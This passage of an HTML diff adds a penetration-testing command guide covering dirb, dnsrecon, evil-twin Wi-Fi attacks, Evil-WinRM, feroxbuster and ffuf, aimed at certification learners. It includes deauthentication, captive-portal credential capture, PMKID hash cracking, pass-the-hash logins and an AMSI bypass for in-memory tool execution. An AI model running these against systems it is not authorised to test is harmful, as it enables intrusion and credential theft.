+<tr><td class="opt-flag"><code>-r</code></td><td>Disable recursive scanning.</td></tr>
+<tr><td class="opt-flag"><code>-S</code></td><td>Silent mode.</td></tr>
+<tr><td class="opt-flag"><code>-z &lt;ms&gt;</code></td><td>Delay between requests.</td></tr>
+<tr><td class="opt-flag"><code>-p &lt;proxy&gt;</code></td><td>Route through a proxy.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Quick triage scan before switching to feroxbuster</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dirb http://$IP -S -o dirb_quick.txt &amp;</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Some testers still background a fast dirb pass as a first-minute sanity check while setting up a proper feroxbuster/ffuf scan with a larger wordlist — it costs nothing to run in parallel and occasionally catches something obvious before the main scan even finishes starting up.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Learn it because it's still in the CPTS/OSCP curriculum and every walkthrough references it, but for actual paid engagement work, default to <code>feroxbuster</code> or <code>ffuf</code> — both covered later in this guide — since the speed difference on a large wordlist against a slow target is the difference between a five-minute scan and a five-hour one.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="dnsrecon">
+      <div class="section-header">
+        <div class="section-number">07</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🧭</span>
+          <h2>dnsrecon</h2>
+          <span class="section-cat">DNS Reconnaissance</span>
+        </div>
+      </div>
+      <p class="section-tagline">Python-based DNS enumeration that bundles zone-transfer testing, brute forcing, and reverse lookups into one tool.</p>
+      <p class="section-overview">dnsrecon sits between dig (surgical, single-query) and amass (broad, multi-source graph building) —
+ it's a good all-in-one when you want standard record enumeration, a zone-transfer attempt, and a brute-force
+ pass without switching tools. It's less actively developed than amass but its output formats (XML/CSV/JSON)
+ make it easy to feed into other tooling or report templates.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All enumeration types (<code>std</code>, <code>axfr</code>, <code>brt</code>, <code>rvl</code>, <code>srv</code>, <code>bing</code>, <code>crt</code>) and flags are accurate.</li>
+<li>Note that the <code>bing</code> source has become unreliable over the past couple of years as Bing has tightened anti-scraping measures — expect it to return little or nothing without a Bing API key configured; <code>crt</code> (certificate transparency) is now the more reliable free source in this tool.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Standard enumeration</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dnsrecon -d example.com</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Runs a full standard sweep — SOA, NS, A, AAAA, MX, SRV, plus a zone-transfer attempt against each nameserver automatically.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A structured list of every standard record type found.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Note the SOA serial and refresh/retry/expire values — unusually long TTLs can hint at infrequently updated legacy infrastructure.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Domain has minimal DNS footprint or the server refused all queries.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Zone transfer attempt</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dnsrecon -d example.com -t axfr</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Explicitly tests every NS record for a zone transfer misconfiguration.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A full record dump if vulnerable — otherwise a clear 'transfer failed' message per server.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>If successful, this alone is often a critical finding — write it up immediately with the full record dump as evidence.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Modern DNS servers reject AXFR from non-whitelisted IPs by default, so failure here is the expected, secure outcome.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-n &lt;server&gt;</code></td><td>Specify a DNS server.</td></tr>
+<tr><td class="opt-flag"><code>-t &lt;type&gt;</code></td><td>Enumeration type: std, axfr, brt, rvl, srv, bing, crt.</td></tr>
+<tr><td class="opt-flag"><code>-D &lt;file&gt;</code></td><td>Dictionary file for brute forcing.</td></tr>
+<tr><td class="opt-flag"><code>-r &lt;range&gt;</code></td><td>IP range for reverse lookups.</td></tr>
+<tr><td class="opt-flag"><code>--threads &lt;n&gt;</code></td><td>Thread count.</td></tr>
+<tr><td class="opt-flag"><code>-j &lt;file&gt;</code></td><td>JSON output.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Reverse-mapping a whole discovered IP block</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dnsrecon -r 203.0.113.0/24 -j reverse_map.json</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>After discovering a client's public IP ranges (via ASN lookup or WHOIS), reverse-mapping the whole block in one pass is a fast way to find hostnames the client didn't intentionally expose — internal naming leaks through PTR records surprisingly often.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Used today mainly as a secondary confirmation tool rather than a primary enumerator — most testers lead with amass or subfinder for coverage, then run dnsrecon's <code>axfr</code> check specifically because it's a fast, free way to test every discovered nameserver for that one high-value misconfiguration.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="eviltwin">
+      <div class="section-header">
+        <div class="section-number">08</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">📶</span>
+          <h2>Evil Twin Attacks</h2>
+          <span class="section-cat">Wireless</span>
+        </div>
+      </div>
+      <p class="section-tagline">Rogue-AP methodology for client-side Wi-Fi engagements — conceptually unchanged, tooling consolidated.</p>
+      <p class="section-overview">The four-phase model (deauth → rogue AP → captive portal → traffic interception) is still accurate
+ conceptually, but the tooling landscape has consolidated. Standalone use of raw hostapd + dnsmasq + a hand-rolled
+ captive portal has mostly given way to integrated frameworks that automate the whole chain, since juggling four
+ separate daemons by hand is error-prone during a live engagement.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>The four phases and their purposes are all accurately described.</li>
+<li><code>aircrack-ng</code>'s <code>aireplay-ng</code> for deauth is correct, though on 802.11w-protected networks (Protected Management Frames, increasingly common as a default in newer routers/APs) simple deauth floods no longer work — testers now need to check for PMF before assuming deauth will succeed.</li>
+<li>wifipumpkin3's description as having a 'Metasploit-like interface' is a fair characterization of its modular plugin system, not literal Metasploit integration.</li>
+<li>Missing tool worth adding: <b>hcxdumptool/hcxtools</b>, now the standard combo for capturing WPA handshakes and PMKID hashes for offline cracking — often a faster and less intrusive route to network access than a full evil-twin captive-portal exercise.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Deauthentication</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>sudo aireplay-ng --deauth 10 -a &lt;AP_MAC&gt; wlan0mon</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Sends spoofed deauth frames pretending to be the legitimate AP, forcing connected clients to disconnect and search for a network to reconnect to.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Client devices dropping off the legitimate network in real time.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Have your rogue AP with the same SSID already broadcasting before you deauth, so disconnected clients reconnect to you instead of the real AP.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No effect against 802.11w-protected (PMF-enabled) networks — deauth frames are authenticated and get silently dropped.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Rogue AP + captive portal (framework-driven)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>sudo wifipumpkin3
+# within the shell:
+set interface wlan0
+set ssid "Same_As_Target"
+startap
+using captiveflask</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>wifipumpkin3 automates AP creation, DHCP/DNS, and captive portal serving in one tool instead of manually chaining hostapd + dnsmasq + a web server.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Connected client count rising in the tool's live dashboard.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Monitor the captive portal's capture log for submitted credentials.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Wireless adapter doesn't support AP mode — check with `iw list` for the AP capability before the engagement, not during it.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>aireplay-ng --deauth</code></td><td>Send deauthentication frames.</td></tr>
+<tr><td class="opt-flag"><code>hostapd</code></td><td>Low-level rogue AP daemon.</td></tr>
+<tr><td class="opt-flag"><code>dnsmasq</code></td><td>DHCP + DNS for the rogue network.</td></tr>
+<tr><td class="opt-flag"><code>wifipumpkin3</code></td><td>Integrated evil-twin framework.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">PMKID capture as a deauth-free alternative</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+hcxpcapngtool capture.pcapng -o hashes.22000
+hashcat -m 22000 hashes.22000 rockyou.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>A significant chunk of current wireless engagements skip the whole evil-twin/captive-portal chain entirely: many consumer and even some enterprise APs leak the PMKID in the very first handshake frame, letting you capture a crackable hash without ever deauthing a client or standing up a rogue AP. It's quieter, faster, and doesn't require the target's Wi-Fi adapter to support AP mode.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Wireless assessments are a smaller slice of most pentesters' work than web/AD testing, but when they do come up, the efficient path today is usually hcxdumptool for a quiet PMKID/handshake grab first, escalating to a full wifipumpkin3-driven evil twin only if credential harvesting via a captive portal is specifically in scope (common for phishing-adjacent social engineering assessments).</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="evilwinrm">
+      <div class="section-header">
+        <div class="section-number">09</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🪟</span>
+          <h2>Evil-WinRM</h2>
+          <span class="section-cat">Windows Remote Access</span>
+        </div>
+      </div>
+      <p class="section-tagline">The de-facto shell for any Windows box with WinRM open — a CPTS/OSCP staple.</p>
+      <p class="section-overview">Once you have valid credentials (password, hash, or a Kerberos ticket) and WinRM (port 5985/5986)
+ is reachable, Evil-WinRM is the fastest path to an interactive, feature-rich PowerShell session — file
+ transfer, AMSI bypass helpers, and in-memory script loading are all built in rather than needing to be
+ scripted by hand.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li><b>Correction:</b> there is no literal built-in <code>bypass</code> command. The correct built-in function name is <code>Bypass-4MSI</code>, and it (along with all other built-in helper functions like <code>Invoke-Binary</code> and <code>Dll-Loader</code>) only becomes available inside the shell after typing <code>menu</code> to load them — they aren't loaded automatically on connect.</li>
+<li><b>Correction:</b> <code>Invoke-Script -ScriptPath /path/to/script.ps1</code> as shown is not real Evil-WinRM syntax. The actual way to load custom PowerShell scripts is to pass a directory of <code>.ps1</code> files at connection time with the <code>-s</code> flag (e.g. <code>-s /path/to/Scripts/</code>) — Evil-WinRM then auto-loads every function it finds in that directory as an in-memory command, avoiding disk writes on the target.</li>
+<li>Upload/download syntax and the persistence/proxy notes are accurate as general concepts.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Connect with a password</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>evil-winrm -i $IP -u zak -p 'zak123'</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Opens an interactive PowerShell session over WinRM using standard credentials.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A prompt like <code>*Evil-WinRM* PS C:\Users\zak\Documents&gt;</code> confirms success.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Run <code>whoami /priv</code> immediately to check for exploitable privileges (SeImpersonatePrivilege is the big one to look for).</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>WinRM not enabled, wrong port, or a firewall blocking 5985/5986 — confirm the port is open with a quick nmap scan first.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Connect with an NTLM hash (pass-the-hash)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>evil-winrm -i $IP -u zak -H &lt;ntlm_hash&gt;</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Authenticates using a captured or dumped NTLM hash with no plaintext password needed.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Same successful prompt as password auth.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Begin post-exploitation enumeration for lateral movement paths.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>WinRM doesn't natively support NTLM pass-the-hash unless the target allows it — if it fails, confirm whether Kerberos auth (via a ticket + `evil-winrm -r`) is a better fit for that environment.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Loading custom scripts and modules at connect time</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>evil-winrm -i $IP -u zak -p 'zak123' -s /opt/PowerShellScripts/</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Auto-loads every .ps1 in the given directory into memory as callable functions the moment the session opens — this is the real mechanism (not the 'Invoke-Script' syntax from the older sheet) for bringing in tools like PowerView or custom enumeration scripts.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A confirmation message per script loaded.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Call the loaded function names directly like any other PowerShell command.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Script syntax errors will silently fail to load — test scripts locally in PowerShell first before relying on them mid-engagement.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>upload &lt;local_path&gt;</code></td><td>Transfer a file to the target.</td></tr>
+<tr><td class="opt-flag"><code>download &lt;remote_path&gt;</code></td><td>Exfiltrate a file from the target.</td></tr>
+<tr><td class="opt-flag"><code>menu</code></td><td>Load and list built-in helper functions (Bypass-4MSI, Invoke-Binary, Dll-Loader, etc.).</td></tr>
+<tr><td class="opt-flag"><code>-s &lt;dir&gt;</code></td><td>Load a directory of local .ps1 scripts into memory at connect.</td></tr>
+<tr><td class="opt-flag"><code>-r</code></td><td>Use Kerberos realm/ticket-based authentication instead of NTLM.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">AMSI bypass then in-memory tool loading (real post-exploitation chain)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>evil-winrm -i $IP -u zak -p 'zak123' -s /opt/tools/PowerSharpPack/
+# inside the shell:
+menu
+Bypass-4MSI
+Invoke-Binary /opt/tools/Rubeus.exe klist</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>This is the standard, real-world Evil-WinRM chain: connect with a scripts directory preloaded, run the built-in AMSI bypass so PowerShell's script-scanning defense stops flagging your tools, then use <code>Invoke-Binary</code> to run a compiled .NET tool (Rubeus, SharpHound, etc.) entirely in memory with no binary ever written to disk.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Still the default WinRM shell in 2026 — nothing has meaningfully replaced it for this specific job. The one shift worth knowing: modern EDR increasingly flags Evil-WinRM's default PowerShell process behavior, so experienced testers now pair it with an AMSI bypass immediately on connect (as shown above) rather than treating it as an afterthought.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="feroxbuster">
+      <div class="section-header">
+        <div class="section-number">10</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🦊</span>
+          <h2>Feroxbuster</h2>
+          <span class="section-cat">Web Content Discovery</span>
+        </div>
+      </div>
+      <p class="section-tagline">Rust-fast, recursive-by-default content discovery — the current go-to for large or deeply nested sites.</p>
+      <p class="section-overview">Feroxbuster's headline feature is that it recurses into discovered directories automatically without
+ you having to re-launch the scan — genuinely useful against modern apps with deep, nested API routing. Its
+ filtering options (by size, word count, line count, status) are also the most granular of the three modern
+ fuzzers covered in this guide, which matters a lot against noisy targets that return a 200 for everything.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All commands, flags, and the recursive-by-default behavior description are accurate for current feroxbuster releases.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Basic recursive scan</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Discovers directories and automatically re-scans every newly found directory without manual restarts.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Nested paths like /api/v1/admin appearing without you ever having pointed the scanner there directly.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Manually browse and analyze anything sensitive-looking; consider bumping recursion depth for very deeply nested apps.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No results at all across a large wordlist likely means a WAF is silently 200-ing every request — check response bodies for a consistent 'not found' page even under status 200.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Extension-aware file scan</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>feroxbuster -u http://$IP -w raft-medium-files.txt -x php,html,txt,bak,old,zip</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Appends common extensions to every wordlist entry, catching backup and source files that a plain directory scan would miss.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Files like config.php.bak or backup.zip that expose source code or credentials.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Download and review anything with a backup/config-style extension immediately — these are consistently high-value findings.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No files found with those extensions doesn't rule out others — try .env, .git, .DS_Store, and .swp as a follow-up pass.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-x &lt;ext,ext&gt;</code></td><td>Extensions to append to wordlist entries.</td></tr>
+<tr><td class="opt-flag"><code>-H &lt;header&gt;</code></td><td>Add a custom header, repeatable for multiple headers.</td></tr>
+<tr><td class="opt-flag"><code>--proxy &lt;url&gt;</code></td><td>Route through a proxy like Burp.</td></tr>
+<tr><td class="opt-flag"><code>-C &lt;codes&gt;</code></td><td>Filter out specific status codes.</td></tr>
+<tr><td class="opt-flag"><code>--fs/--fw/--fl</code></td><td>Filter by response size / word count / line count.</td></tr>
+<tr><td class="opt-flag"><code>-t &lt;n&gt;</code></td><td>Thread/concurrency count.</td></tr>
+<tr><td class="opt-flag"><code>-d &lt;n&gt;</code></td><td>Recursion depth.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Auto-tuning against a noisy 200-everything target</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>feroxbuster -u http://$IP -w raft-medium-directories.txt --auto-tune --dont-filter</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Some modern apps (SPAs with client-side routing) return HTTP 200 for literally every path. feroxbuster's <code>--auto-tune</code> flag adjusts concurrency dynamically based on response time and error rate, and once you've eyeballed the response, adding a manual <code>--fs &lt;size&gt;</code> filter for the app's default 200 page size is the real fix — this is a genuinely common real-world hurdle worth knowing before you hit it live.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">API-focused scan with JSON output for scripting</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>feroxbuster -u http://$IP/api/v1/ -w api_wordlist.txt -x json --json -o results.json</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Modern engagements are increasingly API-heavy; scanning with an API-specific wordlist (SecLists has dedicated ones) and structured JSON output makes it easy to pipe results straight into a script that checks each discovered endpoint for auth requirements automatically.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Feroxbuster and ffuf are the two tools efficient testers actually reach for day-to-day in 2026 — dirb and even gobuster's dir mode are increasingly a fallback. Feroxbuster wins when you want recursion handled automatically; ffuf wins when you need maximum flexibility (multi-position fuzzing, complex filter chains).</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="ffuf">
+      <div class="section-header">
+        <div class="section-number">11</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">⚡</span>
+          <h2>ffuf</h2>
+          <span class="section-cat">Web Fuzzing</span>
+        </div>
+      </div>
+      <p class="section-tagline">The fastest, most flexible general-purpose fuzzer — directories, vhosts, parameters, POST data, all with one syntax.</p>
+      <p class="section-overview">ffuf's core idea is simple but powerful: you put the literal word FUZZ anywhere in a URL, header,
+ or POST body, and it substitutes wordlist entries into that exact spot. That one mechanism covers directory
+ brute forcing, subdomain enumeration, vhost discovery, and parameter fuzzing without needing different tools
+ or modes — which is exactly why it's become the default fuzzer for testers who want one tool that does
+ everything well.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All commands, flags, and the FUZZ-keyword mechanism are accurately described and current.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Directory fuzzing</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>ffuf -w raft-medium-directories.txt -u http://$IP/FUZZ</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Substitutes each wordlist line into the FUZZ position and reports status/size for every response.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Status codes worth investigating: 200 (found), 301/302 (redirect, often to a login), 401/403 (exists but restricted).</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Pipe interesting hits into a deeper recursive scan on that specific subdirectory.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>A WAF returning identical status/size for everything — check response body content, not just status code.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Virtual host fuzzing</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>ffuf -w subdomains-top1million-5000.txt -u http://$IP -H "Host: FUZZ.example.com"</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Finds other web apps hosted on the same server/IP that aren't reachable by IP alone, because the webserver routes by the Host header — extremely common in shared-hosting and internal environments.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Different response length/status for one specific FUZZ value compared to the baseline 'not found' response.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Add the discovered vhost to /etc/hosts and browse it directly.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>All Host headers return identical responses — the server may not be doing name-based virtual hosting at all.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-recursion</code></td><td>Enable recursive scanning into found directories.</td></tr>
+<tr><td class="opt-flag"><code>-fc &lt;codes&gt;</code></td><td>Filter out specific status codes.</td></tr>
+<tr><td class="opt-flag"><code>-fs/-fw/-fl</code></td><td>Filter by size / word count / line count.</td></tr>
+<tr><td class="opt-flag"><code>-fr &lt;regex&gt;</code></td><td>Filter responses matching a regex pattern.</td></tr>
+<tr><td class="opt-flag"><code>-mc &lt;codes&gt;</code></td><td>Match only specific status codes.</td></tr>
+<tr><td class="opt-flag"><code>-t &lt;n&gt;</code></td><td>Threads.</td></tr>
+<tr><td class="opt-flag"><code>-p &lt;s&gt;</code></td><td>Delay between requests, e.g. 0.1-0.5 for randomized rate limiting.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Multi-position fuzzing to chain directory + extension discovery</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>ffuf -w dirs.txt:DIR -w exts.txt:EXT -u http://$IP/DIRFUZZ.EXT -mc 200,301,403</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>ffuf supports multiple independent FUZZ keywords in one request template — here directories and extensions are fuzzed together in a single scan, useful when you specifically suspect backup files (.bak, .old) inside undiscovered directories rather than the webroot.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Autocalibration against noisy WAF/soft-404 targets</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>ffuf -w raft-medium-directories.txt -u http://$IP/FUZZ -ac -acc keyword</code></pre>
